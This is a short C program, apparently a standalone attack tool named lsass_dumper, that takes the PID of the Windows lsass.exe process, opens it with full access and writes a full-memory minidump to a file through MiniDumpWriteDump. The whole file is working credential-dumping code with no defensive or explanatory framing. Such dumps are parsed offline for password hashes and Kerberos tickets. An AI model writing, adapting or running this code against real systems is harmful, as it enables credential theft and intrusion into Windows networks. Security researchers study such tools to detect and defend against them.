#include <stdio.h>
#include <windows.h>
#include <dbghelp.h>

#pragma comment(lib,"dbghelp.lib")

int main(int argc, char **argv){
	
	if (argc != 2){printf("[x] USAGE: ./lsass_dumper.exe <lssas.exe pid>\n");exit(1);}
	
	DWORD PID=atoi(argv[1]);
	HANDLE hProcess;
	HANDLE hDumpFile;
	BOOL bProcDump;
	
	hDumpFile=CreateFileA(
		"dumpfile.dmp",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hDumpFile){printf("[x] Failed to create the file, error: %ld\n",GetLastError());exit(1);}
	
	hProcess=OpenProcess(
		PROCESS_ALL_ACCESS,
		TRUE,
		PID	
	);
	if (hProcess == NULL){printf("[x] Failed to get handle to lsass process, error: %ld\n",GetLastError());exit(1);}
	 
	bProcDump= MiniDumpWriteDump(
		hProcess,
		PID,
		hDumpFile,
		MiniDumpWithFullMemory,
		NULL,
		NULL,
		NULL
	);
	
	if (bProcDump == FALSE){printf("[x] Failed to dump lsass, error: %ld\n",GetLastError());exit(1);}
	
	printf("[+] lsass dumped successfully");

	
	return 0;
	
}